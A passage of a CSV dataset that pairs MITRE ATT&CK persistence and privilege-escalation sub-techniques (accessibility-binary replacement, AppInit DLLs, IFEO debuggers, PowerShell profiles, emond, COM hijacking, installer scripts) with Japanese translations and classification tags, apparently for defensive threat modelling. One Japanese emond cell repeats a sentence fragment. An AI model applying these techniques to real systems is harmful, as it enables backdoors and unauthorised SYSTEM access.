が実行されるたびに発生します。これは自動実行、他の永続化手法、またはシステム上に存在する他のソフトウェア（例：VPN）が通常の機能の一部として netsh.exe を実行する場合に発生する可能性があります。(引用元: Github Netsh Helper CS Beacon)(引用元: Demaske Netsh Persistence),privilege-escalation;persistence,Windows,remote_service_abuse,privilege_gain,endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed,2020-01-24T14:26:51.207Z,2025-04-16T20:37:23.142Z,,,,
T1546.008,T1546,Accessibility Features,アクセシビリティ機能,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system. Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit) Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014) Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse) * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code> * Magnifier: <code>C:\Windows\System32\Magnify.exe</code> * Narrator: <code>C:\Windows\System32\Narrator.exe</code> * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code> * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>",攻撃者は、アクセシビリティ機能によってトリガーされる悪意のあるコンテンツを実行することで、永続化や権限昇格を実現する可能性があります。Windowsには、ユーザーがログインする前（例：Windowsのログオン画面表示時）にキーの組み合わせで起動可能なアクセシビリティ機能が含まれています。 攻撃者はこれらのプログラムの起動方法を改変し、システムにログインせずにコマンドプロンプトやバックドアを取得できます。代表的なアクセシビリティプログラムとして、<code>C:\Windows\System32\sethc.exe</code>（Shiftキーを5回押下で起動）と<code>C:\Windows\System32\utilman.exe</code>（Windowsキー + Uキーの組み合わせで起動）が挙げられます。 sethc.exeプログラムは「スティッキーキー」として知られ、攻撃者がリモートデスクトップログイン画面経由で認証不要アクセスを得る手段として利用されてきた（出典: FireEye Hikit Rootkit）。Windowsのバージョンに応じて、攻撃者はこれらの機能を異なる方法で悪用する可能性がある。 攻撃者がよく用いる手法には、アクセシビリティ機能のバイナリや、レジストリ内のこれらのバイナリへのポインタ/参照の置換が含まれます。新しいバージョンのWindowsでは、置換されたバイナリはx64システム向けにデジタル署名が必要であり、<code>%systemdir%\</code>に存在し、Windowsファイル保護またはリソース保護（WFP/WRP）によって保護されている必要があります。 (引用: DEFCON2016 Sticky Keys) [画像ファイル実行オプションの注入](https://attack.mitre.org/techniques/T1546/012) というデバッガー手法は、対応するアクセシビリティ機能バイナリを置換する必要がないため、潜在的な回避策として発見された可能性が高い。 たとえば、Windows XP 以降および Windows Server 2003/R2 以降では、プログラム（例：<code>C:\Windows\System32\utilman.exe</code>）を「cmd.exe」（またはバックドアアクセスを提供する別のプログラム）に置き換えるという単純なバイナリ置換が可能である。 その後、ログイン画面でキーボード操作中、または[Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)経由接続時に適切なキー操作を行うと、置換されたファイルがSYSTEM権限で実行される。 (引用: Tilbury 2014) 同様の手法で悪用可能な他のアクセシビリティ機能も存在する: (引用: DEFCON2016 Sticky Keys)(引用: Narrator Accessibility Abuse) * 画面キーボード: <code>C:\Windows\System32\osk.exe</code> * 拡大鏡: <code>C:\Windows\System32\Magnify.exe</code> * ナレーター: <code>C:\Windows\System32\Narrator.exe</code> * ディスプレイ切替ツール: <code>C:\Windows\System32\DisplaySwitch.exe</code> * アプリ切替ツール: <code>C:\Windows\System32\AtBroker.exe</code>,privilege-escalation;persistence,Windows,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5,2020-01-24T14:32:40.315Z,2025-04-15T19:58:41.211Z,,,,
T1546.009,T1546,AppCert DLLs,AppCert DLL,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",攻撃者は、プロセスにロードされたAppCert DLLによってトリガーされる悪意のあるコンテンツを実行することで、永続化や特権昇格を実現する可能性があります。<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> 配下の <code>AppCertDLLs</code> レジストリキーで指定されたダイナミックリンクライブラリ（DLL）は、汎用的に使用されるアプリケーションプログラミングインターフェース（API）関数 <code>CreateProcess</code>、<code>CreateProcessAsUser</code>、<code>CreateProcessWithLoginW</code>、<code>CreateProcessWithTokenW</code>、または <code>WinExec</code> を呼び出すすべてのプロセスにロードされます。 （引用元：Elastic Process Injection July 2017）[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、この値を悪用することで、悪意のあるDLLをコンピュータ上の別プロセスコンテキストでロード・実行させ、昇格した権限を取得することが可能です。悪意のあるAppCert DLLは、APIアクティビティによって継続的にトリガーされることで永続性も提供し得ます。,privilege-escalation;persistence,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c,2020-01-24T14:47:41.795Z,2025-04-15T19:58:44.894Z,,,,
T1546.010,T1546,AppInit DLLs,AppInit DLL,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017) Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",攻撃者は、プロセスにロードされたAppInit DLLによってトリガーされる悪意のあるコンテンツを実行することで、永続化と/または特権昇格を確立する可能性があります。レジストリキー<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> または <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> のレジストリキー内の <code>AppInit_DLLs</code> 値で指定されたダイナミックリンクライブラリ（DLL）は、user32.dll をロードするすべてのプロセスに user32.dll によってロードされます。user32.dll は非常に一般的なライブラリであるため、実際にはほぼすべてのプログラムが対象となります。 (引用: Elastic Process Injection July 2017) プロセスインジェクションと同様に、これらの値を悪用することで、悪意のあるDLLをコンピュータ上の別プロセスコンテキストでロード・実行させ、昇格した権限を取得することが可能です。(引用: AppInit Registry) 悪意のあるAppInit DLLは、APIアクティビティによって継続的にトリガーされることで永続性も提供し得ます。 セキュアブートが有効な場合、Windows 8以降のバージョンではAppInit DLL機能が無効化される。(引用: AppInit Secure Boot),privilege-escalation;persistence,Windows,config_policy_manipulation,privilege_gain,privileged_account;user_interaction;endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd,2020-01-24T14:52:25.589Z,2025-04-16T20:37:21.193Z,,,,
T1546.011,T1546,Application Shimming,アプリケーション・シミング,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in: * <code>%WINDIR%\AppPatch\sysmain.sdb</code> and * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code> Custom databases are stored in: * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code> To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",攻撃者は、アプリケーションシムによってトリガーされる悪意のあるコンテンツを実行することで、永続化と/または特権昇格を確立する可能性があります。Microsoft Windowsアプリケーション互換性インフラストラクチャ/フレームワーク（アプリケーションシム）は、オペレーティングシステムのコードベースが時間の経過とともに変化する中で、ソフトウェアの後方互換性を可能にするために作成されました。例えば、アプリケーションシミング機能により、開発者はWindows XP向けに作成されたアプリケーションに（コードを書き換えることなく）修正を適用し、Windows 10で動作させることが可能になります。（引用元： Elastic Process Injection July 2017）このフレームワーク内では、プログラム（より具体的にはインポート アドレス テーブル）と Windows OS の間のバッファとして機能するシムが作成されます。プログラムが実行されると、シム キャッシュを参照して、そのプログラムがシム データベース (.sdb) の使用を必要とするかどうかが判断されます。必要であれば、シム データベースはフックを使用して、OS と通信するために必要なコードのリダイレクトを行います。 デフォルトのWindowsインストーラー（sdbinst.exe）によって現在インストールされているすべてのシムのリストは、以下の場所に保持されます：* <code>%WINDIR%\AppPatch\sysmain.sdb</code> および * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code> カスタムデータベースは以下に保存されます： * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> および * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code> シムのセキュリティを確保するため、Windowsはユーザーモードで実行されるように設計されており、カーネルを変更することはできません。また、シムをインストールするには管理者権限が必要です。 ただし、特定のシムは以下に使用される可能性があります：* [ユーザー アカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002) (UAC および RedirectEXE)* プロセスへの DLL 注入 (InjectDLL)* データ実行防止 (DisableNX) および 構造例外処理 (DisableSEH) の無効化* メモリアドレスの傍受 (GetProcAddress) などの悪意のある行為を実行する可能性があります。これらのシムを利用することで、攻撃者は特権昇格、バックドアのインストール、Windows Defender などの防御機能の無効化など、複数の悪意のある行為を実行できる可能性があります（引用元: FireEye Application Shimming）。また、シムは影響を受けるプログラムによって継続的に呼び出されることで、永続性を確立するために悪用される可能性もあります。,privilege-escalation;persistence,Windows,defense_disable,privilege_gain,privileged_account;user_interaction;endpoint_execution;database_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83,2020-01-24T14:56:24.231Z,2025-04-25T14:46:29.459Z,,,,
T1546.012,T1546,Image File Execution Options Injection,イメージファイル実行オプションの注入,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the ""debugger"" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation. Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",攻撃者は、イメージファイル実行オプション（IFEO）デバッガーによってトリガーされる悪意のあるコンテンツを実行することで、永続化や特権昇格を実現する可能性があります。 IFEOは開発者がアプリケーションにデバッガーをアタッチすることを可能にする。プロセスが作成されると、アプリケーションのIFEOに存在するデバッガーがアプリケーション名の前置され、実質的にデバッガー下で新規プロセスが起動される（例：<code>C:\dbg\ntsd.exe -g notepad.exe</code>）。 (引用元: Microsoft Dev Blog IFEO 2010年3月) IFEOはレジストリ経由で直接設定するか、GFlagsツールによるグローバルフラグで設定可能です。(引用元: Microsoft GFlags 2017年3月) IFEOはレジストリの<code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<実行ファイル名></code>配下に<code>Debugger</code>値として記述され、<code>&lt;実行ファイル名&gt;</code>はデバッガーが接続されるバイナリを指します。 (引用元: Microsoft Dev Blog IFEO 2010年3月) IFEOは、指定されたプログラムがサイレント終了（自身またはカーネルモード以外の第二のプロセスによって早期に終了されること）した際に、任意の監視プログラムを起動することも可能にします。(引用元: Microsoft Silent Process Exit 2017年11月) (引用元: Oddvar Moe IFEO 2018年4月) デバッガーと同様に、サイレント終了の監視はGFlagsを介して、または<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>内のIFEOおよびサイレントプロセス終了レジストリ値を直接変更することで有効化できます。 (引用元: Microsoft Silent Process Exit NOV 2017) (引用元: Oddvar Moe IFEO APR 2018) [アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)と同様に、Windows Vista以降およびWindows Server 2008以降では、レジストリキーを変更することで「cmd.exe」またはバックドアアクセスを提供する他のプログラムを、アクセシビリティプログラム（例：utilman.exe）の「デバッガー」として設定できます。レジストリ変更後、ログイン画面でキーボード操作時または[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)接続時に特定のキー操作を行うと、SYSTEM権限で「デバッガー」プログラムが実行される。(引用: Tilbury 2014) [プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、これらの値は悪意のある実行ファイルをコンピュータ上の別プロセスコンテキストでロード・実行させることで権限昇格を悪用される可能性もある。（引用元: Elastic Process Injection July 2017）IFEOメカニズムのインストールは、継続的なトリガーによる呼び出しを通じて持続性（Persistence）を提供する可能性もある。 マルウェアはIFEOを利用して、無効なデバッガーを登録し、様々なシステムおよびセキュリティアプリケーションをリダイレクトして事実上無効化することで、防御機能を損なうこともできる。(引用元: FSecure Hupigon) (引用元: Symantec Ushedix 2008年6月),privilege-escalation;persistence,Windows,script_command_execution,privilege_gain,authentication_system;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6,2020-01-24T15:05:58.384Z,2025-04-15T19:58:39.823Z,,,,
T1546.013,T1546,PowerShell Profile,PowerShellプロファイル,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments. [PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",攻撃者は、PowerShellプロファイルによってトリガーされる悪意のあるコンテンツを実行することで、永続性と特権昇格を獲得する可能性があります。PowerShellプロファイル（<code>profile.ps1</code>）は、[PowerShell](https://attack.mitre.org/techniques/T1059/001)の起動時に実行されるスクリプトであり、ユーザー環境をカスタマイズするためのログオンスクリプトとして使用できます。 [PowerShell](https://attack.mitre.org/techniques/T1059/001) は、ユーザーまたはホストプログラムに応じて複数のプロファイルをサポートします。たとえば、PowerShell コンソール、PowerShell ISE、Visual Studio Code などの [PowerShell](https://attack.mitre.org/techniques/T1059/001) ホストプログラムごとに異なるプロファイルが存在します。 管理者は、ローカルコンピュータ上の全ユーザーとホストプログラムに適用されるプロファイルを設定することも可能です。（引用元: Microsoft About Profiles）攻撃者は、これらのプロファイルを改変して任意のコマンド、関数、モジュール、および/または[PowerShell](https://attack.mitre.org/techniques/T1059/001)ドライブを含めることで、永続性を獲得する可能性があります。 ユーザーが[PowerShell](https://attack.mitre.org/techniques/T1059/001)セッションを開くたびに、起動時に<code>-NoProfile</code>フラグが使用されない限り、変更されたスクリプトが実行されます。 (引用元: ESET Turla PowerShell May 2019)また、PowerShellプロファイル内のスクリプトが、ドメイン管理者などのより高い権限を持つアカウントによって読み込まれ実行された場合、攻撃者は権限昇格が可能となる可能性があります。(引用元: Wits End and Shady PowerShell Profiles),privilege-escalation;persistence,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3,2020-01-24T15:11:02.758Z,2025-04-15T19:58:06.292Z,,,,
T1546.014,T1546,Emond,Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.",攻撃者は、イベントモニターデーモン（emond）によってトリガーされる悪意のあるコンテンツを実行することで、永続性と権限昇格を獲得する可能性があります。emondは[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)であり、様々なサービスからのイベントを受け取り、簡易ルールエンジンで処理し、アクションを実行します。 <code>/sbin/emond</code>にあるemondバイナリは、<code>/etc/emond.d/rules/</code>ディレクトリからルールを読み込み、明示的に定義されたイベントが発生するとアクションを実行します。ルールファイルはplist形式で、名前、イベントタイプ、実行するアクションを定義します。イベントタイプの例としては、システム起動やユーザー認証などがあります。アクションの例としては、システムコマンドの実行やメール送信などがあります。 emondサービスは、[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)設定ファイル（<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>）で指定されたQueueDirectoriesパス<code>/private/var/db/emondClients</code>にファイルが存在しない場合、起動しません。plist</code>で指定されているQueueDirectoriesパス<code>/private/var/db/emondClients</code>にファイルが存在しない場合、emondサービスは起動しません。(引用元: xorrior emond Jan 2018)(引用元: magnusviri emond Apr 2016)(引用元: sentinelone macos persist Jun 2019) 攻撃者は、システムの起動やユーザー認証など、定義されたイベントが発生したときにコマンドを実行するルールを作成することで、このサービスを悪用する可能性があります。(引用元: xorrior emond 2018年1月)(引用元: magnusviri emond 2016年4月)(引用元: sentinelone macos persist 2019年6月) また、emond サービスは [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) サービスによって root 権限で実行されるため、攻撃者は管理者から root への権限昇格も可能となる。,privilege-escalation;persistence,macOS,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;email_infrastructure;file_storage_access;logging_monitoring,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd,2020-01-24T15:15:13.426Z,2025-04-16T20:37:18.374Z,,,,
T1546.015,T1546,Component Object Model Hijacking,コンポーネント オブジェクト モデル ハイジャック,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model) References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",攻撃者は、Component Object Model（COM）オブジェクトへの参照を乗っ取ることでトリガーされる悪意のあるコンテンツを実行し、永続性を確立する可能性があります。COMは、オペレーティングシステムを介してソフトウェアコンポーネント間の相互作用を可能にするWindows内のシステムです。(引用元: Microsoft Component Object Model) 様々なCOMオブジェクトへの参照はレジストリに保存されます。攻撃者は、永続化手段としてCOM参照と関係を乗っ取ることで、正当なソフトウェアの代わりに実行可能な悪意のあるコードを挿入するためにCOMシステムを利用できます。 COMオブジェクトの乗っ取りには、正当なシステムコンポーネントへの参照を置き換えるためのレジストリ変更が必要であり、これにより当該コンポーネントの実行時に機能不全を引き起こす可能性がある。 通常のシステム操作でそのシステムコンポーネントが実行されると、代わりに攻撃者のコードが実行される。（引用元：GDATA COMハイジャック）攻撃者は、持続性を一定レベルで維持するのに十分な頻度で使用されるオブジェクトをハイジャックする可能性が高いが、検出につながるシステムの不安定化を避けるため、システム内で顕著な機能障害を引き起こす可能性の低いオブジェクトを標的とする傾向がある。,privilege-escalation;persistence,Windows,config_policy_manipulation,privilege_gain,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae,2020-03-16T14:12:47.923Z,2025-04-16T20:37:20.012Z,,,,
T1546.016,T1546,Installer Packages,インストーラーパッケージ,"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton) Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts) Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed. For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)",攻撃者は、インストーラーを利用して悪意のあるコンテンツの実行をトリガーすることで、永続化や権限昇格を実現する可能性があります。インストーラーパッケージはOS固有であり、システムにアプリケーションをインストールするためにオペレーティングシステムが必要とするリソースを含みます。インストーラーパッケージには、インストール前およびインストール完了後に実行されるスクリプトを含めることができます。インストーラースクリプトは、実行時に昇格された権限を継承する可能性があります。 開発者はこれらのスクリプトを、インストール環境の準備、要件チェック、依存関係ダウンロード、インストール後のファイル削除などに頻繁に使用します（引用元: Installer Package Scripting Rich Trouton）。攻撃者は正当なアプリケーションを利用し、改変したインストーラースクリプトを含むアプリケーションを配布して悪意のあるコンテンツを実行させています。ユーザーがアプリケーションをインストールする際、インストールを許可するために管理者権限の付与を求められる場合があります。 